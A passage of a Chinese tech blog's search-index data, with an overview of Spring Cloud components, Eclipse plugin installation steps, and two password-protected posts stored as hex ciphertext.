spring-boot spring-boot-autoconfigure spring-boot-starters spring-boot-cli spring-boot-actuator spring-boot-actuator-autoconfigure spring-boot-test spring-boot-test-autoconfigure spring-boot-loader spring-boot-devtools SpringCloudSpringCloud 站点 SpringCloud Github SpringCloud 官方文档 SpringCloud 中文文档 SpringCloud 中国社区 SpringCloud 学习资源 SpringCloud 教程源码 SpringCloud 示例源码 SpringCloud 是什么SpringCloud 是一系列框架的有序集合。它利用 SpringBoot 的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，同时很方便做到一键启动和部署。SpringCloud 并没有重复制造轮子，它只是将目前各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过 SpringBoot 风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。其中 SpringCloud 为开发人员提供了快速构建分布式系统中一些常见模式的工具（例如配置管理，服务发现，断路器，智能路由，微代理，控制总线，一次性令牌，全局锁定，领导选举，分布式会话，集群状态）。它们适用于任何分布式环境，包括开发人员自己的笔记本电脑，裸机数据中心和 Cloud Foundry 等托管平台。 SpringBoot 与 SpringCloud 的关系 SpringBoot 专注于快速、方便的开发单个微服务个体，SpringCloud 则关注全局的服务治理 SpringCloud 将 SpringBoot 开发的一个个单体微服务整合并管理起来，为各个微服务之间提供配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等集成的服务 SpringBoot 可以离开 SpringCloud 独立使用开发项目，但是 SpringCloud 离不开 SpringBoot，属于依赖的关系 SpringCloud 组件SpringCloud 提供一整套的微服务解决方案，生态内大概有 21 个组件；大致可分成两类，一类是对现有成熟框架 ”SpringBoot 化” 的封装和抽象，也是数量最多的项目；第二类是开发了一部分分布式系统的基础设施的实现，如 Spring Cloud Stream 扮演的就是 Kafka、ActiveMQ 这样的角色。对于想快速实践微服务的开发者来说，第一类组件就已经足够使用，如： Spring Cloud Netflix，是对 Netflix 开发的一套分布式服务框架的封装，包括服务的发现和注册，负载均衡、断路器、REST 客户端、请求路由等 Spring Cloud Config，将配置信息中央化保存，配置 Spring Cloud Bus 可以实现动态修改配置文件 Spring Cloud Bus，分布式消息队列，是对 Kafka、MQ 的封装 Spring Cloud Security，对 Spring Security 的封装，并能配合 Netflix 使用 Spring Cloud Zookeeper，对 Zookeeper 的封装，使之能配置其它 Spring Cloud 的子项目使用 Spring Cloud Eureka，是 Spring Cloud Netflix 微服务套件中的一部分，它基于 Netflix Eureka 做了二次封装，主要负责完成微服务架构中的服务治理功能 SpringCloud 常用组件 Spring Cloud Config：配置管理开发工具包，可以让你把配置放到远程服务器，目前支持本地存储、Git 以及 Subversion Spring Cloud Bus：事件、消息总线，用于在集群（例如，配置变化事件）中传播状态变化，可与 Spring Cloud Config 联合实现热部署 Spring Cloud Netflix：针对多种 Netflix 组件提供的开发工具包，其中包括 Eureka、Hystrix、Zuul、Archaius 等 Netflix Eureka：云端负载均衡，一个基于 REST 的服务，用于定位服务，以实现云端的负载均衡和中间层服务器的故障转移 Netflix Hystrix：容错管理工具，旨在通过控制服务和第三方库的节点，从而对延迟和故障提供更强大的容错能力 Netflix Zuul：边缘服务工具，是提供动态路由，监控，弹性，安全等的边缘服务 Netflix Archaius：配置管理 API，包含一系列配置管理 API，提供动态类型化属性、线程安全配置操作、轮询框架、回调机制等功能 Spring Cloud for Cloud Foundry：通过 Oauth2 协议绑定服务到 CloudFoundry，CloudFoundry 是 VMware 推出的开源 PaaS 云平台 Spring Cloud Sleuth：日志收集工具包，封装了 Dapper、Zipkin 和 HTrace 操作 Spring Cloud Data Flow：大数据操作工具，通过命令行方式操作数据流 Spring Cloud Security：安全工具包，为你的应用程序添加安全控制，主要是指 OAuth2 Spring Cloud Consul：封装了 Consul 操作，Consul 是一个服务发现与配置工具，与 Docker 容器可以无缝集成 Spring Cloud Zookeeper：操作 Zookeeper 的工具包，用于使用 Zookeeper 方式的服务注册和发现 Spring Cloud Stream：数据流操作开发包，封装了与 Redis、RabbitMQ、Kafka 等发送接收消息 Spring Cloud CLI：基于 Spring Boot CLI，可以让你以命令行方式快速建立云组件 SpringCloud 组件概览图 SpringCloud 架构图集SpringCloud 架构图 SpringCloud Alibaba 技术中台架构图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Eclipse 安装插件",url:"/posts/5c9b0a47.html",text:'Eclipse 在线安装阿里巴巴 Java 开发规约插件 打开 Eclipse –&gt; Help –&gt; Install New Software，填写插件的 URL 地址： https://p3c.alibaba.com/plugin/eclipse/update， 然后根据界面提示一步步安装，最后重启 Eclipse。安装成功后，工具栏会新增下图所示的图标。可以通过右键菜单、Toolbar 按钮两种方式手动触发代码检测，同时结果面板中可以对部分实现了 QuickFix 功能的规则进行快速修复。 Eclipse 在线安装 SpringBoot 插件（Spring Tools） 查看 Eclipse 版本，打开 Eclipse –&gt; Help –&gt; About Eclipse。 在 SpringBoot 官网，根据自己的 Eclipse 版本号获取对应的插件 URL 地址。 打开 Eclipse –&gt; Help –&gt; Install New Software，填写插件的 URL 地址，点击 SelectAll 按扭选择安装所有组件，然后取消左下角 Cntact all update site… 这个选项的勾选，否则安装过程会非常缓慢。安装过程中，若提示下图中的组件更新，直接选择 Keep my installation，然后根据界面提示一步步安装，最后重启 Eclipse。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"各种编程语言的开源项目收藏",url:"/posts/73a4d573.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b305b92a3783836c75feaa53ad538edf334d360588c0d85fb1105cbe522a1700ead6bac62dd93ff5054ee8e5ddeff995e4f5b316d520e21c9d9e96b58b0b5a31292db9c42a290313bfbca2d61641cbecded9f516c85019f9b2e6f0f010518cc4de9dd9f21f776689e5efda84edb4934c1e77bfa1bc577d982e100b43d2679d1cd868c55d14370f089983a6f27432c41ace3dfe468e55097b9c5b4c08b9a7a1f50d4a46bae1becfa0cfdacd66b5ca846d4c08c88e7e68a47e5d6cad2511e6dcdaca5eeb813c01bbaddeea0fcc629ea71444d800997abd5fe4d6f47cec052ebd3b4479d4dd0beba9704b131b3a3c5e24fd1a55d8a65ffe4b795d21b5edea33fb69183a4804e726dca10901d750019cb9e05a776c994e504269109c210bc59272609ea4951c8db4c89f56c5a539fde383bdb9267d9e97940b3a3f6bb9392874111f189ae1e44fd5010a6be4e5cd25e62c854bd9a5ee48f6deeaa68bdc23eecbd2ef2b9a66c925d98b11b5471073a3fec9f76245cf6ac83647260bae1fcd37dbca4d7499712c2363c592047f47ced5102b6d525bfed3f493c705d18834fc727fcc46d33457fecf238e12e0edae412fb8b0840f65bd59faa1809ab8d63efe7ce8205749424498e63c3ea87d287519306777c5092992d83f88401225bcabb4f39c875a611e9c80a0bca15cf7ddb2cfcc1a4453618bb158a5e8ee5d98c94c7f36a104b6be2c3ddd49ab8391c588fb8100bf67df36663d09ba41bb493397194384f871189f0ebd60aed89a357d309850f57e99faf57cea76f7309dc67d25cb41ed1219d8093c23181d27e04706d3e4bc5d82f00e1f7d56967f3f0cbc7d2695a77ad8bc08c94ad2d9f9de66552a01c22b910e8e5f5f1ff00969f5aed25333f7bb5b7f9d6f27b6a14749dd93be97fa298a10d04eb188567b54e23a87303e7f1cce4065cea6a10e62704c83d1c344df2433bc4f9e09a76fb8ca01cb435adcb24df7e04ccc0b039147f656d45d70014091f4187c26cf019ba1b224830f23199d40c316e5eeee71c0cec05fefb873047db5d719a7f9793e17450fd8cdc46de71a04deaf8c96d229e677e3c11f08d8feac3c38b8d277a4ad0ea626bf4827ac838538496aadf12a9681a8edfc934644cbcbfdc03b15dd5a056656c0d58eafe91c3a220b686123cbe32e290c071a7d5060ae633ae13acb55a6992cb809702de9e01c8da61009fdae85649b569c43b9daf0fddb8e7fa1d3fbfdb2100bdbcbab114dc6b2790421b303ff33088d9e559590e46742902d669d215014417e9f945fb738cbffb314672129acdd5610bcc48d365c3ede693e2dd52cf193cf2077f577ffcbdafcfb10113992ac41bb64249842f867ac1caaddc5700a99b9f69decdc757d6a2755525230a15e9153d82cc24c6388371e7f111719364c13037047d202a405c8a20ddf7df6ab5a149594f011e6168efbac405f8d0340806862703cf165c1a20a724d2d361d8f060b2ce00bd3ec0f253f950011d59f51cf2a5a990f2b21efa2ba5c4ec4fedefd7d1df608b940fce83658a530fe887c0fe182a9785e6e4815175768b9379e3a88142115c3204c4bef620adbdbacaea9031370e0f6955ae715954c5e52ebc3422395400dab2e123e36439788027b253f346e6bf1e5154b63919c50b07999d7b6138783066de07c4ab289541c9ab5886f6bad4c2fda19a089cd6e6b49358b1988b9a92815702e298a2e7b5e5cb474ca5ed3f59062108353a0a9c9bd46952c4c93b75058ab12a9488301f7555e42ad501f3c2cd5d6493088f69ee418793ff0b03e6b894120486f6eee6491669ac1b5771f0284431d56a660fe1672a8fadc77fe048186187b927e2b41a75a3d24f407d0061334e3c1efa2a9c3e41e02d3868fbb50083681602ac15a6a2f70928c82382e13cfe33fb4c89fd390913d5f2ba53c42700f56335d9e8aaf43c7a1108f61c297fa49b4a969022c793d2acbdb98b612658a8bec70778b75f7f52024b0117f989681d839b0422057e175682d66fcdc849e15430dbb802990db220374e9a109cfbe6e432c64edb4590cf0f2e521beae249db9efce062068ac1e515eb5b226219b5e9a5993bb065ad1811602e536b523d5fffaec3f33016f25db4816932389d2b497117a55b12296543552829f33d9a30a808c388ef334bbace9e240228decccf1ea3c94eea2dbc14c5373e8e1a39e0f0e9e399935e0a13619f2531654e491aa5498fe21ab3482d3e8a246a3ea67168b24b2298e9b5a937cd9f23b4d24ed0dfefda2d90a3e9905e69a776ac3de615680836b4730efb27bf54779ffff12eeda391b77ddca445b3ea8aff5ef133e487b0c1ff06249a9ff180a4929795dda3cd80f974e00b05e7cf1a5bfaea7491fae6f6832f6949e1df281ef4506b1ca24e516d1e47bc6da2c12e34398d9e1d7e26a1f04df9d6037da2d36ee80e32c100ce2c9122d72c0a2ae30618e5ff95664b22d171c3765609dcf86fff1cc8ae6dc50404c7f17fe73cbf3cf72420b46246ee55b50d26e609e7a56c34856229ebbcbc2f56ec179804ac99e5b7aa8df1db64ec20e643f1257bbd9d7870206796702a6b119caac075fcb5e721bc6b87bc7b53df027e05b0b150f51b7af4892cd544d34f26260d7cf1668279f8f4364d0bcea58fc8f2fd25c0f728abb1c453ae09f3a6a3db11998ec062535e4d270398cb9cf4fc8e6c17595311051aa500a4ae8ac9489cbffed4af7cccf7f1140b82c7678882d124e7e61b6d1dd1c23d824d99d4296248e222a7319738b310e9d433e33975aa763caf2b6aaad05ab9bbdebfbdeef1e93fea6184f63bedfb9ce3993929964fdaf94c02126c8d4c854355c166331ebd74e401f0c35deace16e296e3c87938d546295c1cbb32396bdf24e83bdb08b170887329c8927a91c88a08741e6b93922eac31b897675ca99f6cc180fe09fd8ecaf9b8718676688e3da6b8860f74507dcfbe61d25de44abf66e662f4fe165ccea9f04f21175d2f79db5e72ac3ef51b0f78a83eff3c40790fd7c187bfcf3b0881ad147744e3930b1caee0359497c461c67186999fc9f544d96ebe12a3f6e4227b516b3a5b905dca1a68e4f0bb4b63d56b518e9d1e31e40844d8b92ccbab508a1709024745da03bb262011c71a1818bacc145f8efbfbf8e405746b28e8abf106511db7fa15874220b2f8615ac4c12be5fe3b56ef3bc46d229734950344821cc2774c3d293f28735a8de672c4e2f8a6172a30e3fbf27c98431e079f91b6ac6b5aca64bc162e0e10aaeb1bd9b3beac3e1685694a1c81a32af68c4273acef53be3842ff784285c41735e4c6776bd9bf16c0ed6e7d87da5250a04ea14a1cf1c22e67a0aee275654a34c740a3095730168c3a253c72d56152705a2a0cd22b3656913aa2aab6b62fcf1edeeb8c9b4d660fe438408fe0f640fc74d3438ee570dfca936e41dbd1be78c84d26451cef2853e71981babe1bc2fb1a3f6c617177a96c6423bb77a07f11f7451c8d0f1850414617410ab2b3a88ecb4e7856d0e0a8bf6932e7565ec1b759d196ca102a9597baf1fae247fefb1d44e14e887db79872fa88640c175e7489af3b2ffc670213a454fa3abf70102fad7f83b178f70a5b9000de97d1e038da09eb0a7fddec561319b8c5033193fcd44e1d4d7e6320b539882fd6558826d457724081564890b998f4a7d6a1a11ade95d48edd9a9a67dc1d0607e19ea43001710de83044eeb1982a7213dc4ade3f05f8fac8c6203223bfd5fb14408e7ae795803ee5b81a025f3319c2eb447cc377d27e10238cb6c22240f4b02b5e78f4033b551208bf517122a4fd5f1eca4f5d055f7d7bb003ee6d057c1b20db5240a95f4f55e8c13ced95775bb8960ac41f76ae93ee8b3056e3e72a78889449de95fcb11a46398a8ccfbb2925e0796d2a88d2165df37224ab6d6f4ae4c91d88c65de0de5315e8fc394edcacc38b0358e4f04db95558b33d68f63188d9e37334f2b8262146a0f2211cce24412cc3cab87fdd3b098a30ee7a5eed0bd9de26e1e8bbd3a832937d937f2fec4d27281f90cb8d7a0bfba4c00ad0d538744bce5c115b10c410ac419c63ab32a8fc1027d1fa06a84412516ea852aeb7ee95ffbb61e9cef68ea09ece8522b6ab2e5fce9a17a35078c16ee290457288936a8cf7f88e0517fabff6d26e99d7e7812e815a1dd14ee1b1579a72b793203cedf8a39b7f327ba4a0df8489a72dbbc2bab854e06791de2ca795dd5ee0b06ff4b044e5099fb6dcabddbb4891558446f24c3cddd34d3907e1a11c2c3967ff9023ed735821bd1bdd8dcaa651d369c70ea7ad01110222556f524971ad453b4e4995d44e3aa1cea4793d5d1317920b702b2bc901f3769aa63afe8eb31909301675989d977a0e23365b81807d6f1ab018be24f70188c8450e930df6cac7f82e77035ccd3e0966b44f4c429c6cf48c20cc45e4a429676abd4fbfa21c54a1d582f02b359d8c2d76ee4efac9fb989ce8ddf7a2bb124fa61efdd1dec9a74d1952ef9227aff62776773d808e1dfd47028117c3508358d3d39b4f04975b4c9456cb27295aea42f20795a3d161be8958225b101830c020595da858603ceb3744a8ff0587f93bbca3908c21cff5fafea92a99d339066ca39a6680ee1d5d599aabfdd5c81bb390375cf92671f4c63f871d8be74a942d15ae359c19f93056f15824f200c217c73952e426176b0820d892b14fa675b1da2734bafb145b8b992bda3513f5d76d4ff62019d044cf7c231a14c5d8f7d48297a95fe6d3bad4a949bcf252a13a81386079ed21fb360b7196aa5eb8cdcf2b1c99e7dbac574c1a87f7c8c269d06d9045af9129202718c4dc8495daf32915258a41eea4170742e88b108a86776692f3fdfd22abb54e070a5db958328a4324d7f40e2a556e0fd4098779049eb77864f5da185ac8283eed40e168beb5f87ad9e518e603c80629b670278ce973d0f63b95d3ad5e024dc432417e5f2bf8997a82301f1f98f26ffb89f7e5f176bfcaf536e0268e4b716a2cd609c62e34d36186e1f22edc95810255fe80dae4fcc23f8b8fa740bb2f21838c0b5b7c1678aa176b46c68843336b690d29a036274b77bb524eea9d6a5f452f52b69451c60a3e87ccede9f8a71f68823b8df28e26b6839f3f9123f00959e2df19598c41bed09615f83f2e7ce02d0bb6522874955c5a6df1d13b3f4e06e00170d155bc814222a1b9a89d242637ddc59a9a541b9e839537531684d18a85c7c28ad6c52e3032fd781ec39d76a66806bca2e143f21f17773d0ecf667999c3ad2c234b8474fd2c3002070b2a4938f3f9300454354f4f2c260c3a885c7f4be7f84d77bf2e2217c730e56c5a846d2527cc77e12971fc819e4daf80a518bc8b8952ddfb2cadcbf6ad7b8bfc7721f4aa035cc9c3a98cbb1874975a63f1eb55223fe0febc8fbd19ccc89d4885d4bdf49cd604b0405760452aba538c2dfe9f4d71906dd79bf816263e0292b53b64fd25ad1f200ab676e472488d164624a8ebf254cf81c6a979bda2e1b262674a727e7e50f8f03b04d17d625c5c45e0ef14d11bf8a4378ad9c61f90934c4cece652dc1163915f6843fac2a76205b68d516ac7787e4548d84704656d8b8fe935a48d7eeef4630275da06b2b3ea85d6798106b7c7dd3522d7ced256a965cf1f6f10578df046cf36f83619fffb75727137cc751afc3f08618430c3be7e0f3edc2c91e946d79026bc4646367e251e5a1759925f08a2cb0f8545655516f232b481664dcbf87e9da1fc8557160430c4ddb7480c79023209f455c7dbe9030209f3cea9302280f1a14bb574c5655d06d2a8eb03e677161e58508babf4340135ddd76eb17c623d2a311fbde3803cdad4f530d6b1e8203abc2de351620990ce13e3c18d296b6289e8dfa7561b5a4ce80fcd725194fb6ab625a14bb67b288e5ea4e5eba9f7284a363c976dbf93c72caa4edc8cf30f33280e140467bd9f513aa9586b3f1c20971f389d212e05577fb6216b314d128e79b65b49c899da4b4b23d5733006a0bcdf4146edf906d95644111c49d7e3f425c358fcf5384845dd6400e9ed9260e2f03f5827fe9f03bbfa67ba6a31fa4f0e2b940e91ba4c1148172f9eab1a1f035eb41170281deff5eeaa3374685b7406fc86dc338ed56acc03e179fcdb8c022633992e807b72b1438bc534c6d53dfc919edc106119d83300ec811af54dc0e2836afbb82fffe37d3cde970b44e78251019e893181398719e9026bfb97f0985a7b427c84e2a56382f2a44a155a2b07d35d8c2f4057631921e64b4361157b33f8b9cc75c4b1b4856a1fa37c1676ba3de0d9780427bb2dc3f43371b29aa4a8a04f1d262592d8740611bb193a2291947615e87f8c53886b3537aa8239883f32a0b1b35386ff5bb8a729b07c4f7fc25c937edba8bca97ec8000b44a0a50ef8c52c7fcbb0c5a4b7fe73cf2dca088f857676f59412cc3b6fcf91922de753f8a40996bc6247e9cd654ec83b8a54a4e05585fcd3343fb575e04343ad0a2e8c2cc291ff19cad46ef8b02827541bd56d925e2b3be4392169815570d3861ccc2c4a1829f5a8ea390262003e30e8bd53d559afe6d5042a24c9e5288254cc0212a1ddc6731d2c5f05547ca606272e046de1305af41dfcbcf8b7dda0d729a485d8f4e7cd693b0856777eb2ec4ea3bf7d0257b255f21b96128aaa21a9befc59c6a9645062649c2069f19a2106ec144deb4d668b5710f5597cbd1b31179ea2bc9acc13185db272de145d7096b09941e2d191e48f58d78f3bf24cd5962d45d40bd64d6b5d5dd43e44bd3bacadfe7d4ab1feeae6b39fad4972f0feb3eef6357b512f7097bf1d2ec3614620da1013474df3dea3dc299afe423b8e003e75aa84584178ea48dfc9cce4032a7e14eabbb1cce5a9ebcba37dae822a7814c4aea46096c7551f739a99fead21f2e13cf28c7239b13fa569558a76f403e609483fa5f624facde4e7dff5b7957f2085f0ce27e70c740f3d30b960a629d3868ea1e79eafd49593b55dc7c70f456251857286de38f2c416a8b21a53ef94634d5625f8082d41e412c631f1eeae12dbb112cd5e3c5973c60f26678a6e4b4bfce655d064d4d74bfbbaec9ab02cd3ab0677e61894afed0fff5367779ef0e57fc0cf836c3520ffd702c1d30efc098ac7440b6b16929c937c2d2c40380831f5dbc5798936d66dd25c82167a6049088710b6d0b1abecb2db5f848a3063802257dc3da652e2afebe02b8e09cc68fcc509d9233f14feedbaf3aa716025d80b10c8ec0e802a75452234b8ae3b166ff5207c06c5688d1f9b3fbd7acc676684b095680bf4126edebd0e8ce8b4771505b25a0f674ebb9cc6decf133a7309cb84c8b9a065f3b49b4c8364057afc4107d8ae5484a29beb95b7a8c848146df0ed8b481ee2a4df6d0cb8afff2f5b45a6509d3b5ffa0f31ba1384f1d99d5077bac2fa513a87a48516120e2e2d581042cea15752f7c9ed04316870ac411110d6ca8752e52a0b2ae69c6bb00226348ac2fb0c08834df406d866c583506437d7493a26b6dcfd83e0e14377b6e450b19232742f3fcfb6c383d07ede217364b143ddfd95407b9ec61c44ceb76b5de6c1b734f8c5c78bf15a540f608a2d7d7f65c9db04e0fbf173d92d48ac3bb0c8694eb09ba2342dfa1770c0bd6b887be4051a729595dfdfd98a5a5b6a2220fa649cc20786914ba067abc7cffad7641d1cbd773dfc3ae964e03590d49e30d1e720bc61ddf9e99b3d5e54f89b293e02228f7badeeb0e165a730bb366346d4758761d8a6b4a7537b1fe35afbf2184bd7e7ea7ff1affe5333cf99064863bd62ef7be8e179c6aba94ea1a525ca9e6884c4c291ef454684dca3797e79bc393e81c3b2cac21f7665282c64f89fb4a077e15e4935000bc505d8eebb43359cbcdfab847ed88908fe26e9f860af4d4bf2d06eee813ecabf66265192e709e9c56d5bcfea999343f914fd4ebc6d8607f577de433d39ad97b4c6a171c2859eb37486b1618c5b13e216475bf7e5cc8b6c42de2fea0d225fb89f8bfbacda2c66d98f39fbd4f293 请 输 入 阅 读 密 码.",tags:"加密博客 开源"},{title:"Java 开源项目收藏",url:"/posts/5fa2a92a.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b668df2d624a20e7c72c9b9ba7c44e824633c98a0f4b78a33b261e58f4fe1d0da8b0e2fc8a971fbab744945b62b9780e2f2c4df4a84e028a0f321185d45665d40f8e03b5a59c6120af1ab5f9e00c298c85dd69c7a8e20691421780a8d2ed735592258b1d5ba34bc4155a5ee7bbc81975721df386a594872cdf49a55b4f5dad46b7a749100dca98229bf9561b91570e9ba234bd12739e842d01605e484f9908c583e0fb89fe8282f20485187f17583996c814cc3fdc3a461af23d4b633ed7c3eef56ecd2bb5841099f1e24f9f2daa1911dd18bb9ab9857219a74a263fb751df63ec411e845f38e9ad29af8bc1596c60542e4f984129bd60c65e838818dc173f8cd2e56a8e66752ff254e5b99b4faa69711a64db04ef72d934074d4ae875eac3b9193a051f7284cf8060c6e634641b35b406f53412d02befe9ef7c61e905e0f0e9e6a842850f9d9d4d408a07e93fdc94daf365865e3cd00e9b5f8ef233281e63a2b5fe00c0495ee7d81b2a23c0e0eca5b1f57d1f9b1001e27f724399aa0c281d2fb09730b13c65b808d66d5cdfc773475f26011d3c45ee309ae5ae2f6ccf7e680e0ace5bf6bc5fd9b8ad4dcebe0c71c4828a14c4e697a8b4914e6725cad2c488da51ae7938e6f5f49be01726d182dfca76c873f532f3714a432e32d0592b4a21649e72cecc72e58b473937fc158ce7b09bb9f5b4573ba8d0aee3e9bb1458be7803f0589642e3c837ee4debefa8f5ca22ae2d89c1948bb7d666654bde4d756b4c843bda1ea8645e0eab22371dd0d670fa3cbd5fe24d9655518a8b1640ec36ab8b967101868e8171ab34e178d67abaab895405382528c67fe19b388e3601ceab3b286fad5c9c41f2b984916af49992e70ae74e8e90bb498697f3cf174c4894cd630e29f82ff34a8568d95c73fd8d8e9c4199088f516e0e8d2a3b12fd499ecd6a9e5197dc967c0ff9eaf25a58ad83d6ed01125a7f0fb9f930827a95a6ac98e70c99bd7e27e900a60e27cc2e2a82a74f5c99d985cf22af833eb80e502a2ffe81a958ca82dcc96b22ede31e00683726ecf92d5c6788280cca60c65ad8634dab8bad51bc8971d65dfefafcef92c3fab490628a2d07f6d5019ba1abbf12ec017d0d979235ccc4482a56debace4e7543cdd3a1f891ba917592c04e82d2f049405e0f18fafda9601fea2d3fa8dad0b22be8e5123a5d824513e652f2c7abb91e5c87be93f88747faf2dc9e6c661b1cda7a360be13a4ceca5ee72ff03e8ea9375992212f471bd879c50f003b4d442997282f00c5e96f5788f2de85b21b6374525bdf88de05abaecc39ce6d83ddb8c95cb4c0681e08bd293853340edf9133004caa37f492ab0d44ef7129ba663392462226cc2d2c722a17efa138b24b911de6477283c6b358deebb262a18cd6fd49627873d6c976be5ce7370f0aa76b8eb30017dcf2af0e47f119a91f3a4f6e5e3c824cdd7688b6b5b6ac34de24f42b2c9f508583e427984059fa73722e9e12d45f3d5a837d109a8b0f42eb3fa759896077a1df4b928c0346431f210d0df304916f2be7f5885a5b426e52cc7e5144fa92129ba42d89333974b65c50c1d526e4a2db7db94058348168b0f1a418c2176bf1ed4ccfb2a2560b5fbfefc06663766420badb141204df9f73ebfd9181f8b3adbd0ec5a994ea903f868fe8dfe54c874a84b6f36c92667c93ca34898f5de77336bcd925a31d549b9416625dc370bd21955c06f7e103442deaeee80bd214c0f27710469c0438f80fe7d9463537f42ccb256e9dd0c27f54f8441e55a5e94d9c48a58d549812d2c269369941bc97e041415b3c4dff8aae09f7c10b1f638ce553309c89c8186c13398bbe568130041187767792c5cea32248245dced4b48d5d195568c2a64475145f48ebe9f6e7b0d07ab19700d2bd30df03be5aa848e7c547113dc3174c2d2c8a584c68dab6a4c5484b21cb1dd98694dadbd27b9e0881a1bfa184606ce89f6001b93f8384fa8d499cfc588eeb9a9d36963cfb511d9b21ea1826ceae663c4db37e89070cd789eada69f1a6d8659d5078c7c18b8853ef503ead7a00eee541218f3dd5b753638b79d4511421bcf8ceb959a2acf6165dc744c908944455bbff100cb969a7f97b76f449bf8e4f9e586dff2cbf256e97ef6cf3996a3da23eb74796b2c4b5c7c4c77d783ce6d1dbe6c14c1216d42201ef5ab2605b8e4db332039b7d8d0e44a78c070afa7b2bae6d4ee1892e9a9acb97f81529fd2c70790eda3ddca2d21acac4ac5a900e5d0d3061dfcdcd6329fb5fc6de958404ba928c43407dddc6a85a29e6aee531ffb9ed025d9532fb555ee00078194682174bae38533ddc8c53b57d0c3ec14ef8ccc0700e59936807cf146023049b17a06901943ea96dfcde71d241fe4672f47f39ebe0697acada1b8985f56a74e80ad2546be4cc3952ebfb1cba7e83901393131f3b3c922466d525d4da6bf5fc4af4e3d2f66b867a1c27e2f89111cfc7e0b20355283bc352b8e15f18415001aa96a936a9cdcf812122c8b784964823be8679fc89b371ab54f41af7f2c870d1f9c2fbffecf1447b6897cf0619725c874dec9eced41ef451d4509b710750c39a9f72c4ec4bcc723ca73e156c7cab2d09638df137544618a4dceaa88298537d58d733f24045c2fbab5c45f1c3da102b050f283f53baa4258fc9e9514fad808e1ead9c7a49497a97666b4bd49adebf8349c58258e8374c79fa12f2b00fe27d7ef1933151d2c61f8993678f86e0e2dc53a43dabfb9c0cf4a7861fcc27125bf4c6e404fc305a2c7d47ad6a81e9ddaab0c584f25ea2f8a45905c36e9e30eeeecec191b23d33ef427f7c3b09c29b3b5e6fa275a3e7a481bd03198765f39f017fcdcedaadad2acdc65262df440a352cb6e647eec144daae2f831344ab1583e2b4f72ffade4a16885ff17ffff2bc4b6e2e3c4a667e4aa5e7cdb1810538f8788fcd6d1079d39af64dd656983fd4e625fcf7413f83605b9ab2a5b5a417bd8569552a7dc574504349a52ac5afdb6bdc30b009f90ba0879239e2875790feb0301ba40c1fc1a58d129883f5992e668bce8a704db835fe10e907465f5a4e92aac5eb50fc06a868e69faf65561a473bd3c35460cd4c9f655966ef5b5b2fd3c0ac5db5913dbd9a43d8078992ba52820b222eb7998ffe8b3e29fe00815a1652f5a5133c33e54448e0d67777c963ae4c597fc7dc38c40a3fa1244c1842b5d6e5896cf519fc336298422955c4e2d5c36ea0ccbad402aa1c5e6f42eccd50827b12e5f78f88cbaed5134791f48fe884d8f91567059ac20ebd0e98794a6f08ddd5d0dc216930b82fb7607669ba77c3c0faa60dead2b86c6833d36779283a27e4650cc5ec1e1b74a750c9c1d605a70b85f9736a9d3e6bb5febdd9951c0588b4f6b82b9658349a934897a11b0a93b39886db6b7435bc5048d4d455be1765ca1563f8a5dc732e003eef28ac72899b65647097a2716bca5f10ae664b8e091c352f254b4b6a4cc449621028df7a5770558ab88be78b8fbf8cde9873dbf7889492d0f29d906162ddc1d3fc14e5d00d4f5567a6762f9b742bc90c35cef7072e45a443f40f4c64770cf7b4a55ef65c1a94d8f6f92135b9351d5c0ae325370d5298677d728e438feca1c7d40059b6d6531e54874629c16d1615cd848d283a33982bbc9a14a670dd4d197baf628bb13008185bb3b846ecd78b4c17713aa5370e39db6adf0c988e9673634767b6ff81f826525b91b458b8e8d8c6064efa732f5d8b3c9bbe5257a80c2133643836a279fd3e3cbec06b5284ace36d82fcf58505882e1a0559bdfdcbd19dd2af5f86e881c7b85c8742f9b2f0bb6c132e2d0679fa79b73e8f1ed11ed5e871808d00bfe70f4f4bca722ca65435fb94cce9c1fe5a0677b5f8de75202a902b049dc60296bbac69d09b7204cd6b333cbaeb2ae54e25a421738ccca638cfd25b9ab006d20a926d5dc30ea65683886c0c453480f0f5cf30f6245febd9fa6a2256d361b084615646efac82123161b6499fd975fcb96fb090c33464d115991f09c300c63016a4c809cb71fd6e7ba00dea5de1f4b6dc9ca8ba7748b6ac4dbb74198f69ec153cb8dbdc51e02dbbbd8b1363a424bd53949b7ccaacb5c012a845ef3ec95a205c24705952438c9ee79160a07c947d03475ae8e67fa721a968c451b7ea33c5e6c80df20510437882301e9e742287fd3ee38dd0c6ef2501ae109a7bcf8c5893429da2ce7c349d005f0b4771da58ba7f4f827da6d9251cef456116a3f3ac1e2b7e4edb9c09dddacd1bc05239b54316970be420dcc753503a94acd8c3845ecec3f1044d20869b8ae83450abca54bcfdcb968ca594b7f2a2ed2606158b9cb167cc5cec75d05d9da489cbb0cca0c764ed51029d94b1797600f62feeb68fb0e5a8